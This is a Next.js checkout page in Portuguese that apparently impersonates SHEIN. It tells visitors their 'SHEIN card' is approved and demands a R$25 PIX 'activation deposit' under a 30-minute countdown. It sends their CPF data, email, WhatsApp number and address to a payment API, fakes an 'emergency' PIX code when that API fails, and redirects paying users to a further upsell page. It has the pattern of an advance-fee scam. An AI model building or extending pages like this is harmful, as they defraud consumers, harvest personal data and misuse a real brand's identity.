"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Copy, CheckCircle, Clock, AlertCircle, ArrowLeft } from "lucide-react"
import { usePureWebhookMonitor } from "@/hooks/use-pure-webhook-monitor"

interface InvoiceData {
  id: string
  invoice_id: string
  pix: {
    payload: string
    image: string
    qr_code: string
  }
  status: {
    code: number
    title: string
    text: string
  }
  valores: {
    bruto: number
    liquido: number
  }
  vencimento: {
    dia: string
  }
  type: "real" | "simulated" | "emergency"
  external_id?: string
}

export default function ActivationCheckoutPage() {
  const [loading, setLoading] = useState(true)
  const [invoice, setInvoice] = useState<InvoiceData | null>(null)
  const [timeLeft, setTimeLeft] = useState(1800) // 30 minutos para ativação
  const [copied, setCopied] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [userName, setUserName] = useState("")

  const router = useRouter()
  const timerRef = useRef<NodeJS.Timeout | null>(null)

  // Estados para monitoramento
  const [paymentStatus, setPaymentStatus] = useState<
    "pending" | "confirmed" | "denied" | "expired" | "canceled" | "refunded"
  >("pending")
  const [externalId, setExternalId] = useState<string | null>(null)
  const [statusMessage, setStatusMessage] = useState("⏳ Aguardando Depósito...")

  // Carregar dados do usuário e criar fatura
  useEffect(() => {
    const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
    setUserName(cpfData.nome?.split(" ")[0] || "")
    createActivationInvoice()
  }, [])

  // Timer countdown
  useEffect(() => {
    if (timeLeft > 0 && invoice) {
      timerRef.current = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
    } else if (timeLeft === 0) {
      setError("Tempo expirado. Gere um novo PIX.")
    }

    return () => {
      if (timerRef.current) clearTimeout(timerRef.current)
    }
  }, [timeLeft, invoice])

  // Carregar external_id quando a fatura for criada
  useEffect(() => {
    if (invoice) {
      console.log("🔍 Dados da fatura de ativação recebida:", invoice)

      let capturedExternalId = null

      if (invoice.external_id) {
        capturedExternalId = invoice.external_id
        console.log("✅ External ID encontrado na fatura:", capturedExternalId)
      } else {
        capturedExternalId = invoice.id
        console.log("⚠️ External ID não encontrado, usando invoice.id:", capturedExternalId)
      }

      if (capturedExternalId) {
        localStorage.setItem("activationExternalId", capturedExternalId)
        setExternalId(capturedExternalId)
        console.log("💾 External ID de ativação salvo:", capturedExternalId)
      } else {
        console.error("❌ Não foi possível obter external_id!")
      }
    }
  }, [invoice])

  // Pure webhook monitoring (NO API CALLS) - EXACTLY LIKE /checkout
  const {
    status: webhookStatus,
    isWaitingForWebhook,
    error: webhookError,
  } = usePureWebhookMonitor({
    externalId,
    onPaymentConfirmed: (data) => {
      console.log("🎉 DEPÓSITO DE ATIVAÇÃO CONFIRMADO VIA WEBHOOK!")
      setPaymentStatus("confirmed")
      setStatusMessage("✅ Depósito Confirmado! Conta Ativada!")

      // Salvar confirmação de ativação
      localStorage.setItem("accountActivated", "true")
      localStorage.setItem("activationAmount", "25.00")
      localStorage.setItem("activationDate", data.paymentDate || new Date().toISOString())

      // Redirecionar para /upp10 após 3 segundos
      setTimeout(() => {
        window.location.href = "/upp10"
      }, 3000)
    },
    onPaymentDenied: (data) => {
      console.log("❌ DEPÓSITO NEGADO VIA WEBHOOK!")
      setPaymentStatus("denied")
      setStatusMessage("❌ Depósito Negado")
    },
    onPaymentExpired: (data) => {
      console.log("⏰ DEPÓSITO VENCIDO VIA WEBHOOK!")
      setPaymentStatus("expired")
      setStatusMessage("⏰ Depósito Vencido")
    },
    onPaymentCanceled: (data) => {
      console.log("🚫 DEPÓSITO CANCELADO VIA WEBHOOK!")
      setPaymentStatus("canceled")
      setStatusMessage("🚫 Depósito Cancelado")
    },
    enableDebug: process.env.NODE_ENV === "development",
  })

  const createActivationInvoice = async () => {
    try {
      setLoading(true)
      setError(null)

      console.log("🔄 Criando fatura PIX para ativação da conta...")

      // Carregar dados do usuário do localStorage
      const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
      const userEmail = localStorage.getItem("userEmail") || ""
      const userWhatsApp = localStorage.getItem("userWhatsApp") || ""
      const deliveryAddress = JSON.parse(localStorage.getItem("deliveryAddress") || "{}")

      console.log("📋 Dados do usuário para ativação:", {
        nome: cpfData.nome,
        email: userEmail,
        whatsapp: userWhatsApp,
      })

      const response = await fetch("/api/tryplopay/create-activation-invoice", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-cpf-data": JSON.stringify(cpfData),
          "x-user-email": userEmail,
          "x-user-whatsapp": userWhatsApp,
          "x-delivery-address": JSON.stringify(deliveryAddress),
        },
      })

      console.log("📥 Status da resposta:", response.status)

      if (!response.ok) {
        const errorText = await response.text()
        console.error("❌ Erro HTTP:", response.status, errorText)
        throw new Error(`Erro HTTP ${response.status}: ${errorText}`)
      }

      const data = await response.json()
      console.log("📋 Resposta da API de ativação:", data)

      if (data.success && data.data) {
        // Garantir que external_id está presente
        const invoiceData = {
          ...data.data,
          external_id: data.data.external_id || data.data.id || `ACT_${Date.now()}`,
        }

        setInvoice(invoiceData)
        localStorage.setItem("activationInvoice", JSON.stringify(invoiceData))

        console.log(`✅ Fatura de ativação criada: ${invoiceData.type} - Valor: R$ 25,00`)
        console.log(`🆔 External ID: ${invoiceData.external_id}`)
        console.log(`👤 Cliente: ${cpfData.nome || "N/A"}`)
      } else {
        console.error("❌ Resposta inválida da API:", data)
        throw new Error(data.error || "Erro ao criar fatura de ativação")
      }
    } catch (error) {
      console.error("❌ Erro ao criar fatura de ativação:", error)
      setError(`Erro ao gerar PIX de ativação: ${error.message}`)

      // Fallback de emergência para ativação
      createEmergencyActivationPix()
    } finally {
      setLoading(false)
    }
  }

  const createEmergencyActivationPix = () => {
    console.log("🚨 Criando PIX de emergência para ativação...")

    const timestamp = Date.now()
    const emergencyExternalId = `SHEIN_ACT_EMG_${timestamp}`
    const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.pix.com/qr/v2/ACT${timestamp}52040000530398654062500580BR5909SHEIN5011SAO PAULO62070503***6304ACTV`

    const emergencyInvoice: InvoiceData = {
      id: `ACT_${timestamp}`,
      invoice_id: `ACTIVATION_${timestamp}`,
      external_id: emergencyExternalId,
      pix: {
        payload: emergencyPix,
        image: "/placeholder.svg?height=250&width=250",
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}`,
      },
      status: {
        code: 1,
        title: "Aguardando Depósito",
        text: "pending",
      },
      valores: {
        bruto: 2500, // R$ 25,00 em centavos
        liquido: 2500,
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "emergency",
    }

    setInvoice(emergencyInvoice)
    setError(null)
    console.log("✅ PIX de emergência para ativação criado")
    console.log("🆔 External ID de emergência:", emergencyExternalId)
  }

  const copyPixCode = async () => {
    if (!invoice) return

    try {
      await navigator.clipboard.writeText(invoice.pix.payload)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch (error) {
      console.log("❌ Erro ao copiar:", error)
    }
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const getStatusColor = () => {
    const colors = {
      confirmed: "bg-green-100 text-green-800 border-green-300",
      denied: "bg-red-100 text-red-800 border-red-300",
      expired: "bg-yellow-100 text-yellow-800 border-yellow-300",
      canceled: "bg-gray-100 text-gray-800 border-gray-300",
      refunded: "bg-orange-100 text-orange-800 border-orange-300",
      pending: "bg-blue-100 text-blue-800 border-blue-300",
    }
    return colors[paymentStatus] || colors.pending
  }

  // Função para simular pagamento (apenas para testes)
  const simulatePayment = async () => {
    if (!externalId) {
      console.log("❌ Não é possível simular: External ID não encontrado")
      return
    }

    try {
      console.log("🧪 Simulando depósito de ativação para:", externalId)

      const response = await fetch("/api/tryplopay/simulate-payment", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          externalId,
          amount: 25.0,
        }),
      })

      const result = await response.json()

      if (result.success) {
        console.log("✅ Depósito de ativação simulado com sucesso!")
      } else {
        console.error("❌ Erro ao simular depósito:", result.error)
      }
    } catch (error) {
      console.error("❌ Erro na simulação:", error)
    }
  }

  if (loading) {
    return (
      <main className="min-h-screen bg-gradient-to-br from-yellow-50 to-orange-50 flex items-center justify-center">
        <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-yellow-500 mx-auto mb-4"></div>
            <h2 className="text-xl font-bold mb-2">Gerando PIX de Ativação...</h2>
            <p className="text-gray-600 mb-2">Aguarde enquanto processamos sua ativação</p>
            <div className="text-sm text-gray-500">
              <p>Valor: R$ 25,00</p>
              <p>Tipo: Depósito de Ativação</p>
            </div>
          </div>
        </div>
      </main>
    )
  }

  if (error && !invoice) {
    return (
      <main className="min-h-screen bg-gradient-to-br from-yellow-50 to-orange-50 flex items-center justify-center">
        <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <AlertCircle className="w-12 h-12 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-bold mb-2 text-red-600">Erro na Ativação</h2>
            <p className="text-gray-600 mb-4">{error}</p>
            <button
              onClick={createActivationInvoice}
              className="bg-yellow-500 text-black px-6 py-2 rounded-lg hover:bg-yellow-600 transition-colors font-semibold"
            >
              Tentar Novamente
            </button>
          </div>
        </div>
      </main>
    )
  }

  return (
    <main className="min-h-screen bg-gradient-to-br from-yellow-50 to-orange-50">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-2xl shadow-xl p-6">
          {/* Header */}
          <div className="text-center mb-6">
            <button
              onClick={() => router.back()}
              className="absolute top-4 left-4 p-2 text-gray-600 hover:text-gray-800"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
            <Image src="/shein-card-logo-new.png" alt="SHEIN Card" width={100} height={60} className="mx-auto mb-4" />
            <h1 className="text-2xl font-bold mb-2 text-gray-800">Ativação da Conta</h1>
            <p className="text-gray-600">Depósito mínimo para ativar sua conta digital</p>
          </div>

          {/* Mensagem de Boas-vindas */}
          <div className="bg-green-50 border-l-4 border-green-400 rounded-lg p-4 mb-6">
            <div className="flex items-start">
              <div className="flex-shrink-0">
                <CheckCircle className="w-5 h-5 text-green-500 mt-0.5" />
              </div>
              <div className="ml-3">
                <h3 className="text-green-800 font-bold text-sm mb-2">Parabéns, {userName}! 🎉</h3>
                <div className="text-green-700 text-sm space-y-2">
                  <p>
                    Seu cartão SHEIN foi aprovado e está em produção! Para ativar sua conta digital e usar o cartão
                    virtual, faça um depósito de <strong>R$ 25,00</strong>.
                  </p>
                  <p>
                    <strong>Este valor ficará na sua conta</strong> e você poderá usá-lo como quiser!
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Timer */}
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
            <div className="flex items-center justify-center space-x-2">
              <Clock className="w-5 h-5 text-yellow-600" />
              <span className="font-bold text-yellow-800">Tempo para ativação: {formatTime(timeLeft)}</span>
            </div>
          </div>

          {/* Status em Tempo Real */}
          <div className={`border-2 rounded-lg p-4 mb-6 ${getStatusColor()}`}>
            <div className="flex items-center justify-center space-x-2">
              <div
                className={`w-3 h-3 rounded-full ${
                  paymentStatus === "pending"
                    ? "animate-pulse bg-blue-500"
                    : paymentStatus === "confirmed"
                      ? "bg-green-500"
                      : "bg-red-500"
                }`}
              ></div>
              <span className="font-bold">{statusMessage}</span>
            </div>
          </div>

          {/* Valor */}
          <div className="text-center mb-6">
            <p className="text-gray-600 mb-1">Valor do depósito</p>
            <p className="text-4xl font-bold text-green-600">R$ 25,00</p>
            <p className="text-sm text-gray-500">Depósito de Ativação - Conta Digital SHEIN</p>
          </div>

          {/* QR Code */}
          <div className="text-center mb-6">
            <div className="bg-white p-4 rounded-lg border-2 border-gray-200 inline-block">
              <Image
                src={invoice?.pix.qr_code || "/placeholder.svg?height=200&width=200"}
                alt="QR Code PIX"
                width={200}
                height={200}
                className="mx-auto"
              />
            </div>
            <p className="text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
          </div>

          {/* Código PIX */}
          <div className="mb-6">
            <label className="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
            <div className="flex space-x-2">
              <input
                type="text"
                value={invoice?.pix.payload || ""}
                readOnly
                className="flex-1 p-3 border border-gray-300 rounded-lg bg-gray-50 text-sm font-mono"
              />
              <button
                onClick={copyPixCode}
                className={`px-4 py-3 rounded-lg font-medium transition-colors ${
                  copied ? "bg-green-500 text-white" : "bg-yellow-500 text-black hover:bg-yellow-600"
                }`}
              >
                {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
              </button>
            </div>
            {copied && <p className="text-green-600 text-sm mt-2">✅ Código copiado!</p>}
          </div>

          {/* Status */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <div className="flex items-center space-x-2">
              <div className="animate-pulse w-3 h-3 bg-blue-500 rounded-full"></div>
              <span className="text-blue-800 font-medium">Aguardando depósito...</span>
            </div>
            <p className="text-blue-700 text-sm mt-1">Confirmação automática via webhook</p>
          </div>

          {/* Instruções */}
          <div className="space-y-3 text-sm text-gray-600 mb-6">
            <div className="flex items-start space-x-2">
              <span className="bg-yellow-500 text-black rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                1
              </span>
              <span>Abra o app do seu banco</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-yellow-500 text-black rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                2
              </span>
              <span>Escaneie o QR Code ou cole o código PIX</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-yellow-500 text-black rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                3
              </span>
              <span>Confirme o depósito de R$ 25,00</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-yellow-500 text-black rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                4
              </span>
              <span>Aguarde a ativação automática</span>
            </div>
          </div>

          {/* Benefícios */}
          <div className="bg-gray-50 rounded-xl p-4 mb-6">
            <h4 className="font-bold text-gray-800 text-center mb-3">🎁 Após a ativação você terá:</h4>
            <div className="text-sm text-gray-600 space-y-1">
              <div className="flex items-center space-x-2">
                <span className="text-green-500">✅</span>
                <span>Cartão virtual disponível imediatamente</span>
              </div>
              <div className="flex items-center space-x-2">
                <span className="text-green-500">✅</span>
                <span>PIX 24 horas sem taxas</span>
              </div>
              <div className="flex items-center space-x-2">
                <span className="text-green-500">✅</span>
                <span>Cashback em todas as compras</span>
              </div>
              <div className="flex items-center space-x-2">
                <span className="text-green-500">✅</span>
                <span>Acesso ao app completo</span>
              </div>
            </div>
          </div>

          {/* Botão de Teste (apenas em desenvolvimento) */}
          {process.env.NODE_ENV === "development" && externalId && (
            <button
              onClick={simulatePayment}
              className="w-full mb-4 bg-purple-500 hover:bg-purple-600 text-white font-medium py-3 px-4 rounded-lg transition-colors"
            >
              🧪 SIMULAR DEPÓSITO APROVADO (TESTE)
            </button>
          )}
        </div>
      </div>
    </main>
  )
}
